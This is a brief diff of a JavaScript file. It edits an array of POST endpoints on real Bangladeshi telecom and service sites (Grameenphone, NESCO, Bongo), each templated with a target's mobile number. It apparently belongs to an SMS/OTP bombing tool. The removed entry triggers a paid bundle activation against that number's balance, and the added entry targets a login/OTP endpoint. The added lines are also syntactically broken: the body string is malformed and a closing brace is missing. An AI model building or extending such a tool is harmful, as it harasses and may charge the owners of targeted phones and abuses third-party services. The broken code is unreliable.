@@ -14,9 +14,8 @@ $(document).ready(() => {
             const APIS = [
                 {
                     method: "POST",
-                    url: `https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation`,
-                    body: {"payment_mode":"mobile_balance","longevity":3,"voice":25,"data":2560,"fourg":0,"bioscope":0,"sms":0,"mca":0,"msisdn":"{mobile}","price":78.87,"bundle_id":408890,"is_login":false}
-                },
+                    url: `http://nesco.sslwireless.com/api/v1/login`,
+                    body: 'phone_number":${mobile}',
                 {
                     method: 'POST',
                     url: "https://api.bongo-solutions.com/auth/api/login/send-otp",
